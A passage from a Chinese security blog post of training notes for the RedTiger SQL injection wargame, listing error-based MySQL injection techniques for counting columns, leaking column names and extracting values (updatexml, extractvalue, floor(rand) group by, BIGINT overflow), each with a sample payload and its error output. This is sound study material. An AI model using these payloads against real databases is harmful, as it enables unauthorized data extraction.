<!doctype html><html lang=zh-cn dir=ltr>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="前言 靶场地址：http://redtiger.labs.overthewire.org/ 按照靶场约定，不会直接给任何解。仅记录在这个靶场练习"><title>redtiger靶场训练笔记</title>
<link rel=canonical href=https://nnnewb.github.io/blog/p/redtiger-lab-training-notes/>
<link rel=stylesheet href=/blog/scss/style.min.8620c11ff935a5d342b5db4472643ebc0b4e9d20346a8730d3bf81e0b248f600.css><script src=https://unpkg.com/dayjs@1.8.21/dayjs.min.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/plugin/relativeTime.js></script>
<script src=https://unpkg.com/dayjs@1.8.21/locale/zh-cn.js></script>
<script>dayjs.locale('zh-cn'),dayjs.extend(dayjs_plugin_relativeTime)</script><meta property="og:title" content="redtiger靶场训练笔记">
<meta property="og:description" content="前言 靶场地址：http://redtiger.labs.overthewire.org/ 按照靶场约定，不会直接给任何解。仅记录在这个靶场练习">
<meta property="og:url" content="https://nnnewb.github.io/blog/p/redtiger-lab-training-notes/">
<meta property="og:site_name" content="weakptr's 笔记">
<meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="security"><meta property="article:tag" content="redtiger"><meta property="article:published_time" content="2022-05-06T09:12:42+08:00"><meta property="article:modified_time" content="2022-05-06T09:12:42+08:00">
<meta name=twitter:title content="redtiger靶场训练笔记">
<meta name=twitter:description content="前言 靶场地址：http://redtiger.labs.overthewire.org/ 按照靶场约定，不会直接给任何解。仅记录在这个靶场练习">
</head>
<body class=article-page>
<script>(function(){const a='StackColorScheme';localStorage.setItem(a,"dark")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky">
<button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
<span class=hamburger-box>
<span class=hamburger-inner></span>
</span>
</button>
<header>
<figure class=site-avatar>
<a href=/blog>
<img src=/blog/img/avatar_hub37949326d1692892aa1e64434c0dda6_382115_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
</a>
<span class=emoji>🍑</span>
</figure>
<div class=site-meta>
<h1 class=site-name><a href=/blog>weakptr's 笔记</a></h1>
<h2 class=site-description>弃船！</h2>
</div>
</header><ol class=social-menu>
<li>
<a href=https://github.com/nnnewb/ target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg>
</a>
</li>
</ol><ol class=menu id=main-menu>
<li>
<a href=/blog><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>首页</span>
</a>
</li>
<li>
<a href=/blog/about><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>关于我</span>
</a>
</li>
<li>
<a href=/blog/archive><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>归档</span>
</a>
</li>
<li>
<a href=/blog/categories><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
<span>分类</span>
</a>
</li>
<li>
<a href=/blog/tags><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11 3l9 9a1.5 1.5.0 010 2l-6 6a1.5 1.5.0 01-2 0L3 11V7a4 4 0 014-4h4"/><circle cx="9" cy="9" r="2"/></svg>
<span>标签</span>
</a>
</li>
<li>
<a href=/blog/link><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>友链</span>
</a>
</li>
<li>
<a href=/blog/search><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>搜索</span>
</a>
</li>
<div class=menu-bottom-section>
</div>
</ol>
</aside>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/blog/categories/security/>
security
</a>
</header>
<div class=article-title-wrapper>
<h2 class=article-title>
<a href=/blog/p/redtiger-lab-training-notes/>redtiger靶场训练笔记</a>
</h2>
</div>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2022-05-06T09:12:42+08:00>2022年 5月 6日</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
阅读时长: 7 分钟
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<h2 id=前言>前言</h2>
<p>靶场地址：http://redtiger.labs.overthewire.org/</p>
<p>按照靶场约定，不会直接给任何解。仅记录在这个靶场练习的时候学到的东西。</p>
<h2 id=error-based-sql-injection>error based SQL injection</h2>
<p>red tiger 靶场都是盲注，但还是要提一嘴。学到多少算多少。error based SQL injection 顾名思义要靠错误，所以前端有错误消息回显才有用。但盲注的时候依然能用到一些相关技巧。</p>
<h3 id=当前表列数量>当前表列数量</h3>
<h4 id=group-by-法>group by 法</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=mi>5</span><span class=p>;</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=err>错误</span><span class=w> </span><span class=p>[</span><span class=mi>1054</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=mi>42</span><span class=n>S22</span><span class=p>]:</span><span class=w> </span><span class=k>Unknown</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=s1>&#39;5&#39;</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=s1>&#39;group statement&#39;</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=mi>5</span><span class=w> </span><span class=err>是列号，不存在列的时候报上面的错，需要自己枚举</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>5</span><span class=w> </span><span class=err>直到确认。因为一次测一个真</span><span class=o>/</span><span class=err>假所以盲注的时候也能用。</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><h4 id=order-by-法>order by 法</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=mi>4</span><span class=p>,</span><span class=mi>5</span><span class=p>,</span><span class=mi>6</span><span class=p>,</span><span class=mi>7</span><span class=p>,</span><span class=mi>8</span><span class=p>,</span><span class=mi>9</span><span class=p>,</span><span class=mi>10</span><span class=p>,</span><span class=mi>11</span><span class=p>,</span><span class=mi>12</span><span class=p>,</span><span class=mi>13</span><span class=p>,</span><span class=mi>14</span><span class=p>,</span><span class=mi>15</span><span class=p>;</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=err>错误</span><span class=w> </span><span class=p>[</span><span class=mi>1054</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=mi>42</span><span class=n>S22</span><span class=p>]:</span><span class=w> </span><span class=k>Unknown</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=s1>&#39;3&#39;</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=s1>&#39;order clause&#39;</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=mi>3</span><span class=w> </span><span class=err>是列号，</span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=err>法一次可以枚举很多列，大多时候可以一次拿到当前表的列数。不过盲注的时候不行。可以用来缩小范围。</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><h4 id=子查询法>子查询法</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=p>(</span><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=p>)</span><span class=o>=</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>);</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=err>错误</span><span class=w> </span><span class=p>[</span><span class=mi>1241</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=mi>21000</span><span class=p>]:</span><span class=w> </span><span class=n>Operand</span><span class=w> </span><span class=n>should</span><span class=w> </span><span class=n>contain</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=k>column</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>这个方法直接爆出有几个列，但要求知道表名</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><h4 id=union-法>union 法</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>all</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>,</span><span class=k>NULL</span><span class=p>,</span><span class=k>NULL</span><span class=p>,</span><span class=k>NULL</span><span class=p>,</span><span class=k>NULL</span><span class=p>,</span><span class=k>NULL</span><span class=p>,</span><span class=k>NULL</span><span class=w> 
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=p>(</span><span class=n>types</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>columns</span><span class=w> </span><span class=n>must</span><span class=w> </span><span class=k>match</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=n>be</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>derived</span><span class=w> </span><span class=n>types</span><span class=w> </span><span class=k>or</span><span class=w> </span><span class=k>NULL</span><span class=p>)</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=err>错误</span><span class=w> </span><span class=p>[</span><span class=mi>1222</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=mi>21000</span><span class=p>]:</span><span class=w> </span><span class=n>The</span><span class=w> </span><span class=n>used</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>statements</span><span class=w> </span><span class=n>have</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=n>different</span><span class=w> </span><span class=nb>number</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>columns</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>利用</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=err>查询列数量必须相等来确定左侧查询的列数量，如果左侧是</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=err>的话那</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=err>查询枚举的列数量就是表里列的数量</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><h3 id=获取列名>获取列名</h3>
<h4 id=unionnotnull>union+notnull</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>all</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=o>%</span><span class=mi>0</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>3</span><span class=p>);</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=n>Error</span><span class=p>:</span><span class=w> </span><span class=k>Column</span><span class=w> </span><span class=s1>&#39;id&#39;</span><span class=w> </span><span class=n>cannot</span><span class=w> </span><span class=n>be</span><span class=w> </span><span class=k>null</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>实测发现在</span><span class=w> </span><span class=n>MySQL</span><span class=w> </span><span class=mi>5</span><span class=p>.</span><span class=mi>7</span><span class=w> </span><span class=err>中不好使了，会出现</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=err>错误</span><span class=w> </span><span class=p>[</span><span class=mi>1242</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=mi>21000</span><span class=p>]:</span><span class=w> </span><span class=n>Subquery</span><span class=w> </span><span class=k>returns</span><span class=w> </span><span class=k>more</span><span class=w> </span><span class=k>than</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>row</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><h4 id=insert>insert</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>insert</span><span class=w> </span><span class=k>into</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=n>username</span><span class=p>,</span><span class=n>passwd</span><span class=p>)</span><span class=w> </span><span class=k>values</span><span class=w> </span><span class=p>(</span><span class=k>if</span><span class=p>(</span><span class=mi>1</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span><span class=k>NULL</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>),</span><span class=w> </span><span class=s1>&#39;2&#39;</span><span class=p>,</span><span class=s1>&#39;3&#39;</span><span class=p>)</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=n>Error</span><span class=p>:</span><span class=w> </span><span class=k>Column</span><span class=w> </span><span class=s1>&#39;id&#39;</span><span class=w> </span><span class=n>cannot</span><span class=w> </span><span class=n>be</span><span class=w> </span><span class=k>null</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>要先得到列名，。而且实测</span><span class=w> </span><span class=n>MySQL</span><span class=w> </span><span class=mi>5</span><span class=p>.</span><span class=mi>7</span><span class=w> </span><span class=err>里对主键</span><span class=o>+</span><span class=err>自增</span><span class=o>+</span><span class=err>非空，即使直接</span><span class=k>insert</span><span class=w> </span><span class=k>null</span><span class=w> </span><span class=err>也会成功。</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><h4 id=join>join</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>JOIN</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=n>a</span><span class=p>)</span><span class=n>b</span><span class=p>;</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=n>Error</span><span class=p>:</span><span class=w> </span><span class=n>Duplicate</span><span class=w> </span><span class=k>column</span><span class=w> </span><span class=n>name</span><span class=w> </span><span class=s1>&#39;id&#39;</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>同样失效了。</span><span class=n>MySQL</span><span class=w> </span><span class=mi>5</span><span class=p>.</span><span class=mi>7</span><span class=w> </span><span class=err>下会返回重复的列名。</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><h3 id=获取值>获取值</h3>
<h4 id=count-floorrand02-group-by>count floor(rand(0)*2) group by</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=k>COUNT</span><span class=p>(</span><span class=o>*</span><span class=p>),</span><span class=w> </span><span class=n>CONCAT</span><span class=p>(</span><span class=k>version</span><span class=p>(),</span><span class=w> </span><span class=n>FLOOR</span><span class=p>(</span><span class=n>RAND</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>)</span><span class=w> </span><span class=p>)</span><span class=n>x</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>GROUP</span><span class=w> </span><span class=k>BY</span><span class=w> </span><span class=n>x</span><span class=p>;</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=err>错误</span><span class=w> </span><span class=p>[</span><span class=mi>1062</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=mi>23000</span><span class=p>]:</span><span class=w> </span><span class=n>Duplicate</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=s1>&#39;5.7.331&#39;</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=k>key</span><span class=w> </span><span class=s1>&#39;&lt;group_key&gt;&#39;</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>需要注意的是</span><span class=w> </span><span class=k>COUNT</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=err>不能少</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><em>Works because mysql insides executes this query by making two queries: add count of x into temp table and if error (x value does not exist) then insert x value (second time x calculation) into table</em></p>
</blockquote>
<h4 id=bigint-unsigned>BIGINT UNSIGNED</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=o>!</span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>version</span><span class=p>())</span><span class=n>x</span><span class=p>)</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=o>~</span><span class=mi>0</span><span class=p>;</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>在</span><span class=w> </span><span class=n>MySQL</span><span class=w> </span><span class=mi>5</span><span class=p>.</span><span class=mi>7</span><span class=w> </span><span class=err>不起效。</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=nb>BIGINT</span><span class=w> </span><span class=n>UNSIGNED</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=k>is</span><span class=w> </span><span class=k>out</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>range</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=s1>&#39;((not((select `x`.`version()` from (select version() AS `version()`) `x`))) - ~(0))&#39;</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><p>不过还存在一个能爆出列名的 payload。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>if</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>test</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>test</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>1</span><span class=p>),</span><span class=w> </span><span class=mi>18446744073709551610</span><span class=p>,</span><span class=w> </span><span class=mi>18446744073709551610</span><span class=p>);</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>注意</span><span class=w> </span><span class=mi>18446744073709551610</span><span class=w> </span><span class=err>就是</span><span class=w> </span><span class=o>~</span><span class=mi>0</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=err>错误</span><span class=w> </span><span class=p>[</span><span class=mi>1690</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=mi>22001</span><span class=p>]:</span><span class=w> </span><span class=k>Data</span><span class=w> </span><span class=n>truncation</span><span class=p>:</span><span class=w> </span><span class=nb>BIGINT</span><span class=w> </span><span class=n>UNSIGNED</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=k>is</span><span class=w> </span><span class=k>out</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>range</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=s1>&#39;(2 * if(((select `test`.`test`.`id`,`test`.`test`.`name` from `test`.`test` limit 1) &gt; (select `test`.`test`.`id`,`test`.`test`.`name` from `test`.`test` limit 1)),18446744073709551610,18446744073709551610))&#39;</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>这里会把</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=err>展开成具体列名</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><h4 id=updatexml>updatexml</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=n>concat</span><span class=p>(</span><span class=s1>&#39;~&#39;</span><span class=p>,</span><span class=w> </span><span class=k>version</span><span class=p>()),</span><span class=w> </span><span class=mi>1</span><span class=p>);</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=err>错误</span><span class=w> </span><span class=p>[</span><span class=mi>1105</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=n>HY000</span><span class=p>]:</span><span class=w> </span><span class=n>XPATH</span><span class=w> </span><span class=n>syntax</span><span class=w> </span><span class=n>error</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;~5.7.33&#39;</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><h4 id=extractvalue>extractvalue</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=k>select</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=n>concat</span><span class=p>(</span><span class=s1>&#39;~&#39;</span><span class=p>,</span><span class=w> </span><span class=k>version</span><span class=p>()));</span><span class=w>
</span><span class=w></span><span class=o>#</span><span class=w> </span><span class=k>SQL</span><span class=w> </span><span class=err>错误</span><span class=w> </span><span class=p>[</span><span class=mi>1105</span><span class=p>]</span><span class=w> </span><span class=p>[</span><span class=n>HY000</span><span class=p>]:</span><span class=w> </span><span class=n>XPATH</span><span class=w> </span><span class=n>syntax</span><span class=w> </span><span class=n>error</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;~5.7.33&#39;</span><span class=w>
</span></code></pre></td></tr></table>
</div>
</div><h4 id=st_longfromgeohash>ST_LongFromGeoHash</h4>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
